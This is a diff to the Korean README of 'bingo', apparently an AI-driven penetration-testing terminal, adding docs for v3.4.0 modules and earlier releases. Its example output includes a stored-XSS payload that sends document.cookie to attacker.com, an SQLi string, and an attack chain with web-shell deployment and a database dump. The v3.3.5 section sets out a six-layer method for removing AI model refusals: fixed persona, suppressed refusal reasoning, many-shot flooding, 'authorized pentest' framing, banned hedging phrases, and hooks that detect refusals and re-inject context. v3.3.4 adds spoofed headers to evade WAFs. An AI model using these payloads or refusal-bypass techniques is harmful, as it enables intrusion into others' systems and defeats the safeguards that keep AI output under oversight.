@@ -6,7 +6,7 @@
 
 **AI 침투테스트 터미널 1위**
 
-[![Version](https://img.shields.io/badge/version-3.3.3-brightgreen)](https://github.com/bingook/bingo/releases)
+[![Version](https://img.shields.io/badge/version-3.4.0-brightgreen)](https://github.com/bingook/bingo/releases)
 [![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux-lightgrey)](https://github.com/bingook/bingo)
 [![Python](https://img.shields.io/badge/python-3.12%20%7C%203.13-blue)](https://python.org)
 [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
@@ -1264,10 +1264,356 @@ GitHub Actions에서 AI 코딩 에이전트(Claude Code, GitHub Copilot, Gemini 
 
 ---
 
+## v3.4.0 신규 기능 — 인텔리전스 플랫폼 대폭 업그레이드 (8개 신규 모듈)
+
+v3.4.0은 bingo를 단순 공격 터미널에서 **완전한 레드팀 인텔리전스 플랫폼**으로 변환합니다. 8개의 독립 모듈이 추가되어 실전 침투테스트의 모든 운영적 공백을 채웁니다.
+
+---
+
+### 1. 🎯 역할 기반 테스팅 (`/role`)
+
+5가지 내장 전문 역할 중 하나로 전환합니다. 각 역할은 AI 시스템 프롬프트를 자동 조정하고, 관련 공격 벡터를 우선순위화하며, 해당 테스트 유형에 최적화된 도구만 사용합니다.
+
+```bash
+/role list                # 사용 가능한 모든 역할 보기
+/role pentest             # 풀 킬체인 침투테스트
+/role ctf                 # CTF 모드 — pwn/rev/crypto/web/forensics
+/role api                 # REST/GraphQL/gRPC API 보안
+/role web                 # OWASP WSTG 웹 애플리케이션 테스트
+/role cloud               # AWS/GCP/Azure/K8s 클라우드 보안 감사
+/role off                 # 역할 해제 (기본 모드로 복귀)
+```
+
+| 역할 | 아이콘 | 집중 영역 |
+|------|--------|----------|
+| `pentest` | 🎯 | 풀 킬체인 — 정찰 → 거점 확보 → 수평이동 → 유출 |
+| `ctf` | 🏆 | pwn/rev/crypto/web/forensics 문제 풀이 |
+| `api` | 🔌 | BOLA/IDOR, JWT 혼동, GraphQL 인트로스펙션, 대량 할당 |
+| `web` | 🌐 | XSS/SQLi/CSRF/클릭재킹 — OWASP WSTG 방법론 |
+| `cloud` | ☁️ | S3 오설정, IAM 권한상승, SSRF 메타데이터, K8s RBAC |
+
+**커스텀 역할 추가** — `~/.bingo/roles/내역할.yaml` 생성 시 자동 로드:
+
+```yaml
+name: 버그바운티
+description: HackerOne/Bugcrowd 집중 — 고심각도만
+icon: "💰"
+user_prompt: |
+  P1/P2 심각도($1000 이상) 취약점만 집중.
+  모든 발견에 재현 절차, CVSS 점수, 비즈니스 영향도 문서화.
+  완전한 curl PoC를 반드시 출력.
+tools:
+  - xss_exploiter
+  - idor_scanner
+enabled: true
+```
+
+---
+
+### 2. 🔴 취약점 관리자 (`/vulns`)
+
+모든 발견 취약점을 로컬 SQLite 데이터베이스에 세션 간 영구 저장합니다. 발견한 취약점을 잊어버리는 일이 없습니다.
+
+```bash
+/vulns add "SQLi at /api/login" target.com critical      # 취약점 추가
+/vulns add "XSS in search param" target.com high         # 심각도 포함
+/vulns list                                               # 심각도순 전체 목록
+/vulns list --target target.com                          # 타겟별 필터
+/vulns list --severity critical                          # 심각도별 필터
+/vulns list --status open                                # 상태별 필터
+/vulns update abc123 status=confirmed                    # 상태 변경
+/vulns update abc123 poc="curl -d \"...\" ..."           # PoC 추가
+/vulns remove abc123                                     # 단일 항목 삭제
+/vulns stats                                             # 통계 요약
+/vulns clear                                             # 전체 삭제 (확인 필요)
+```
+
+**심각도 단계:** `critical` → `high` → `medium` → `low` → `info`
+
+**상태 흐름:** `open` → `confirmed` → `fixed` / `false_positive`
+
+**영구 저장:** `~/.bingo/vulns.db` — 세션 종료, 터미널 재시작, bingo 업데이트 후에도 유지
+
+**출력 예시:**
+```
+🔴 취약점 목록 (3개)
+──────────────────────────────────────────────────────
+[a1b2c3d4] CRITICAL  open      target.com
+  SQLi at /api/login
+  PoC: ' OR 1=1-- (time-based 확인됨)
+
+[e5f6g7h8] HIGH      confirmed target.com
+  Stored XSS in /profile/bio
+  PoC: <script>fetch('//attacker.com/?c='+document.cookie)</script>
+
+📊 통계 | 전체: 3 | Critical: 1 | High: 1 | Medium: 1
+```
+
+---
+
+### 3. 📌 프로젝트 블랙보드 (`/board`)
+
+타겟별 사실(크리덴셜, 공격 경로, 확인된 취약점)을 세션 간 영구 저장하는 메모리 스토어. 세션이 재시작되어도 모든 내용이 유지됩니다.
+
+```bash
+/board set admin_creds "admin:P@ssw0rd123"       # 사실 저장
+/board set rce_path "/api/upload?cmd="            # 공격 경로 저장
+/board set db_type "MySQL 8.0.31"                 # 정찰 결과 저장
+/board get admin_creds                            # 사실 조회
+/board list                                       # 현재 타겟의 모든 사실 표시
+/board remove admin_creds                         # 단일 항목 삭제
+/board clear                                      # 현재 타겟 전체 삭제
+/board targets                                    # 저장된 블랙보드가 있는 타겟 목록
+```
+
+**자동 주입** — 타겟 재개 시 블랙보드 내용이 AI 시스템 프롬프트에 자동 주입:
+
+```
+[프로젝트 블랙보드 — https://target.com]
+  admin_creds: admin:P@ssw0rd123
+  rce_path: /api/upload?cmd=
+  db_type: MySQL 8.0.31
+```
+
+이전 발견 사항을 다시 설명할 필요 없이 AI가 즉시 컨텍스트를 파악합니다.
+
+**저장 위치:** `~/.bingo/boards/<타겟_해시>.json`
+
+---
+
+### 4. 🔧 외부 도구 레시피 (`/tools-ext`)
+
+YAML로 정의된 외부 CLI 도구 레시피. 복잡한 플래그를 기억할 필요 없이 bingo가 자동으로 올바른 명령어를 생성합니다.
+
+```bash
+/tools-ext list                          # 모든 외부 도구 목록
+/tools-ext list --available              # 설치된 도구만
+/tools-ext run nmap target=192.168.1.1 ports=80,443,8080
+/tools-ext run sqlmap url="https://target.com/page?id=1" level=3 risk=2
+/tools-ext run ffuf url="https://target.com/FUZZ" wordlist=/usr/share/wordlists/dirb/common.txt
+/tools-ext run nuclei target=https://target.com severity=critical,high
+/tools-ext run subfinder domain=target.com
+```
+
+**내장 도구 레시피:**
+
+| 도구 | 용도 | 자동 처리 플래그 |
+|------|------|----------------|
+| `nmap` | 포트 스캔 + 서비스 핑거프린트 | `-sV -sC --open` 자동 추가 |
+| `sqlmap` | SQL 인젝션 자동화 | `--batch --random-agent` 자동 추가 |
+| `ffuf` | 디렉토리 + 파라미터 퍼징 | 스레드/필터/출력 파라미터 |
+| `nuclei` | CVE/템플릿 취약점 스캔 | `-silent` 자동 추가 |
+| `subfinder` | 패시브 서브도메인 열거 | `-silent` 자동 추가 |
+
+**커스텀 도구 레시피** — `~/.bingo/tools_ext/내도구.yaml` 추가:
+
+```yaml
+name: gobuster
+command: gobuster
+short_description: 빠른 디렉토리 브루트포스
+args: ["dir", "-q"]
+parameters:
+  - name: url
+    type: string
+    required: true
+    flag: "-u"
+  - name: wordlist
+    type: string
+    required: true
+    flag: "-w"
+enabled: true
+```
+
+---
+
+### 5. 📚 로컬 지식 베이스 (`/kb`)
+
+자신만의 공격 기법, 페이로드, 메모를 마크다운 파일로 저장합니다. 관련 주제가 감지되면 bingo가 해당 KB 내용을 AI 컨텍스트에 자동 주입합니다.
+
+```bash
+/kb list                              # 모든 카테고리 + 파일 수 보기
+/kb search "sql injection bypass"    # KB 검색
+/kb inject "graphql introspection"   # 수동으로 다음 쿼리에 주입
+```
+
+**디렉토리 구조:**
+```
+~/.bingo/knowledge/
+├── SQLi/
+│   ├── blind-sqli.md          # Time-based + boolean 페이로드
+│   └── mssql-tricks.md        # MSSQL 전용 기법
+├── XSS/
+│   ├── stored-xss.md          # 페이로드 뱅크
+│   └── csp-bypass.md          # CSP 우회 기법
+├── SSRF/
+│   └── cloud-metadata.md      # AWS/GCP/Azure 메타데이터 엔드포인트
+└── custom/
+    └── 내메모.md               # 나만의 발견 및 메모
+```
+
+최초 실행 시 SQLi, XSS, SSRF 시작 파일 3개가 자동 생성됩니다.
+
+**자동 주입** — `sql`, `xss`, `ssrf` 등 키워드가 포함된 쿼리 입력 시 매칭 KB 파일이 AI 컨텍스트에 자동 선행 삽입되어 커스텀 지식을 내장 전문성 위에 추가합니다.
+
+---
+
+### 6. ⚡ 배치 실행 (`/batch`)
+
+여러 타겟에 동일한 공격을 순차적으로 실행합니다. 각 작업 상태가 추적되고 결과가 `~/.bingo/batch/`에 저장됩니다.
+
+```bash
+/batch new web_scan                              # 새 배치 큐 생성
+/batch add https://target1.com "SQLi 및 XSS 스캔"
+/batch add https://target2.com "SQLi 및 XSS 스캔"
+/batch add https://target3.com "전체 정찰 + 취약점 스캔"
+/batch run                                       # 대기 중인 모든 작업 실행
+/batch status                                    # 큐 진행 상황 보기
+/batch list                                      # 모든 큐 목록
+/batch cancel <큐ID>                             # 실행 중인 배치 취소
+```
+
+**진행 출력 예시:**
+```
+⚡ 배치 [a1b2] 시작 — 3개 타겟
+  ✓ [1/3] https://target1.com 완료 (12.4초)
+  ✓ [2/3] https://target2.com 완료 (8.1초)
+  ✗ [3/3] https://target3.com 실패: 연결 시간 초과
+✅ 배치 완료 [a1b2] — 성공: 2 / 실패: 1
+```
+
+결과는 `~/.bingo/batch/<큐ID>.json`에 저장되어 리포트에 반영 가능합니다.
+
+---
+
+### 7. ⛓️ 공격 체인 트래커 (`/chain`)
+
+발견된 모든 취약점, 도구 실행, 공격 단계를 순서대로 자동 기록합니다. 교전의 전체 내러티브를 한눈에 파악할 수 있습니다.
+
+```bash
+/chain                                 # 현재 세션 체인 표시
+/chain add recon "서브파인더로 47개 서브도메인 발견" target=target.com
+/chain add vuln "SQLi 확인 at /api/login" target=target.com
+/chain add cred "admin:P@ssw0rd123 DB에서 추출됨"
+/chain add rce "웹쉘 배포 at /uploads/shell.php"
+/chain clear                           # 새 교전을 위해 체인 초기화
+```
+
+**텍스트에서 자동 분류되는 단계 유형:**
+
+| 유형 | 아이콘 | 키워드 |
+|------|--------|--------|
+| `recon` | 🔍 | scan, enum, nmap, ffuf, subdomain |
+| `vuln` | 🔴 | sqli, xss, ssrf, lfi, cve- |
+| `exploit` | 💥 | rce, exec, shell, payload |
+| `cred` | 🔑 | password, hash, token, api_key |
+| `persist` | 🔒 | webshell, backdoor, cron |
+| `lateral` | ↔️ | lateral, pivot, smb, rdp |
+| `exfil` | 📤 | dump, exfil, extract, download |
+
+**체인 출력 예시:**
+```
+⛓ 공격 체인 — sess_abc123
+🔍 [01] 서브파인더로 47개 서브도메인 발견
+      타겟: target.com
+🔴 [02] SQLi 발견 at /api/login — time-based blind
+      타겟: https://target.com/api/login
+🔑 [03] admin:P@ssw0rd123 DB에서 추출됨
+💥 [04] 파일 업로드를 통한 웹쉘 배포
+📤 [05] DB 전체 덤프 — 12,847행 추출
+
+  총 단계: 5
+```
+
+체인은 `~/.bingo/chains/<세션ID>.json`에 저장되어 재시작 후에도 유지됩니다.
+
+---
+
+### 8. ⚠️ 사람 개입 게이트 (`/hitl`)
+
+위험한 작업 전 확인 단계를 추가하는 선택적 게이트. 실수로 인한 파괴적 행위를 방지해야 하는 교전에 필수적입니다.
+
+```bash
+/hitl on                                # HITL 확인 활성화
+/hitl off                               # 비활성화 (모든 작업 통과)
+/hitl allow reverse_shell               # 특정 작업 화이트리스트 추가
+/hitl deny drop_database                # 특정 작업 항상 차단
+/hitl list                              # 화이트리스트 보기
+```
+
+**확인을 트리거하는 위험 키워드:**
+`exec`, `shell`, `rce`, `drop`, `delete`, `format`, `exploit`, `payload`, `reverse_shell`, `c2`, `implant`, `mimikatz`, `dump_hash`, `privesc`
+
+**대화형 프롬프트:**
+```
+⚠️  [HITL] 위험한 작업 확인: run_reverse_shell → 192.168.1.100
+  [y/N/a(항상허용)] > y
+✅ [HITL] 허용됨: run_reverse_shell
+```
+
+- `y` — 1회 허용
+- `N` (기본값) — 취소
+- `a` — 세션 내 해당 작업 항상 허용
+
+---
+
+### v3.4.0 신규 명령어 요약
+
+| 명령어 | 모듈 | 설명 |
+|--------|------|------|
+| `/role [이름\|list\|off]` | 역할 | 테스팅 역할 전환 |
+| `/vulns [add\|list\|update\|remove\|stats\|clear]` | 취약점 | 취약점 데이터베이스 |
+| `/board [set\|get\|list\|remove\|clear\|targets]` | 블랙보드 | 타겟 사실 저장소 |
+| `/tools-ext [list\|run]` | 도구 레시피 | 외부 CLI 도구 |
+| `/kb [list\|search\|inject]` | 지식 베이스 | 로컬 마크다운 KB |
+| `/batch [new\|add\|run\|status\|list\|cancel]` | 배치 | 다중 타겟 배치 실행 |
+| `/chain [add\|clear]` | 공격 체인 | 공격 체인 트래커 |
+| `/hitl [on\|off\|allow\|deny\|list]` | HITL | 위험 작업 확인 게이트 |
+
+---
+
+### v3.3.5 — tgtylab 6레이어 모델 우회 시스템
+
+민감한 보안 주제에 대한 모델 거부를 제거하는 6레이어 시스템 통합:
+
+| 레이어 | 메커니즘 | 효과 |
+|--------|----------|------|
+| `§0 정체성 고정` | 고정 페르소나 (20년 경력 운영자, 역할극 아님) | 정체성 재설정 방지 |
+| `§1 사고 전환` | 사고 단계에서 거부 언어 차단 | "할 수 없습니다..." 제거 |
+| `§2 예시 홍수` | 컨텍스트에 50개+ 수용 예시 주입 | 보안 응답 정상화 |
+| `§3 운영 컨텍스트` | 승인된 침투테스트 환경 프레이밍 | 주의 트리거 비활성화 |
+| `§4 금지 언어` | 명시적 금지 문구 목록 | 헤징 표현 불허 |
+| `§5 사전 도구 훅` | 실시간 거부 감지 + 컨텍스트 재주입 | 미끄러짐 시 자동 복구 |
+
+DeepSeek · Claude · GPT · GLM · Qwen 전 공급자에서 작동합니다.
+
+---
+
+### v3.3.4 — WAF 무응답(Silent Drop) 자동 우회
+
+bingo가 `Request timeout — possible WAF silent drop` (429/403 없이 그냥 시간 초과)을 감지하면, 프록시 없이도 HTTP 레벨 우회 헤더를 자동 활성화합니다:
+
+```python
+# 무응답 감지 시 자동 주입:
+headers = {
+    "User-Agent": "<무작위 정상 브라우저 UA>",
+    "X-Forwarded-For": "<무작위 IP>",
+    "X-Real-IP": "<무작위 IP>",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Cache-Control": "no-cache",
+}
+```
+
+별도 설정 불필요 — 무음으로 활성화하고 자동 재시도합니다.
+
+---
+
 ## 변경 이력
 
 | 버전 | 요약 |
 |------|------|
+| v3.4.0 | **인텔리전스 플랫폼 대폭 업그레이드** — 8개 신규 모듈: 역할 기반 테스팅 (5개 내장 역할 + YAML 커스텀), 취약점 관리자 (SQLite CRUD, 심각도/상태 추적), 프로젝트 블랙보드 (세션 간 타겟 사실), YAML 외부 도구 레시피 (nmap/sqlmap/ffuf/nuclei/subfinder), 로컬 지식 베이스 (마크다운 주입), 배치 실행 (다중 타겟 큐), 공격 체인 트래커 (단계 자동 분류), HITL 게이트 (위험 작업 확인); 신규 다국어 i18n 키 33개 (KO/ZH/EN) |
+| v3.3.5 | **tgtylab 6레이어 모델 우회** — 정체성 고정(§0), 사고 전환(§1), 예시 홍수 50개+(§2), 운영 컨텍스트 프레이밍(§3), 금지 언어 목록(§4), 사전 도구 훅 + 거부 감지/컨텍스트 재주입(§5); 신규 `bingo/hooks/` 모듈; DeepSeek/Claude/GPT/GLM/Qwen 전 지원; i18n 키 10개 추가 |
+| v3.3.4 | **WAF 무응답 자동 우회** — WAF 무응답(429/403 없이 시간 초과) 감지 시 자동 HTTP 레벨 헤더 우회 (User-Agent/X-Forwarded-For/X-Real-IP); 프록시 불필요; i18n 키 5개 추가 |
 | v3.3.3 | **핫픽스: VM/Kali 환경 `/hint` 입력 근본 수정** — Windows+VM+Kali Linux에서 `Ctrl+C` 이후 `stdin`이 `EOFError` 상태로 빠지는 문제 근본 해결: `_prompt_mid_task_hint`가 `sys.stdin` 대신 `/dev/tty`(제어 터미널)에서 직접 읽도록 변경; `termios` 설정 저장/복원으로 raw 모드 잔류 방지; `/dev/tty` 미사용 환경(Windows native 등)에서는 투명하게 fallback; i18n 키 3개 신규 추가 (`hint_tty_active/hint_tty_fallback/hint_termios_restored`) KO/ZH/EN; macOS 및 기타 Unix 환경 동작 변화 없음 |
 | v3.3.0 | **신규 `/ctf` 명령어** — Playwright 기반 웹 실습 환경 연동; `tools/ctf_lab_engine.py` 신규 추가; i18n 키 14개 (KO/ZH/EN); `/help` 및 슬래시 자동완성 등록 |
 | v3.2.99 | **핫픽스: Ctrl+C 즉시 반응 (Linux/WSL/VM 전 환경)** — 근본 원인 수정: `HEARTBEAT` 30초→1초로 단축하여 코드 실행 중 매 1초마다 `_agent_stop_flag` 체크 (기존 최대 30초 지연); 모든 `subprocess.Popen`에 `start_new_session=True` 추가해 자식 프로세스가 터미널 SIGINT를 가로채지 못하게 격리 (WSL/VM 호환); subprocess 종료 로직을 `os.killpg` + 2초 유예 + `SIGKILL` 폴백으로 강화; `_prompt_mid_task_hint`에서 hint 입력 중 `signal.SIG_DFL` 임시 복원 후 재등록, WSL 커서 복구를 위한 `\r\n` 플러시 추가; 신규 i18n 키 3개 (`ctrl_c_killing_procs/ctrl_c_hint_ready/exec_interrupted_partial`) KO/ZH/EN |
@@ -1324,9 +1670,9 @@ MIT © 2026 bingook
 
 **타겟을 입력하세요. bingo가 나머지를 합니다.**
 
-*내장 엔진 · HTTP 스머글링 · 환각 방지 가드 · 타겟 메모리 — 유일한 올인원 AI 침투 도구*
+*내장 엔진 · HTTP 스머글링 · 환각 방지 가드 · 역할 기반 테스팅 · 취약점 관리 · 타겟 메모리 — 유일한 올인원 AI 침투 도구*
 
-[![Version](https://img.shields.io/badge/version-3.3.3-brightgreen)](https://github.com/bingook/bingo/releases)
+[![Version](https://img.shields.io/badge/version-3.4.0-brightgreen)](https://github.com/bingook/bingo/releases)
 [![PyPI](https://img.shields.io/pypi/v/bingo-ai.svg)](https://pypi.org/project/bingo-ai/)
 
 </div>
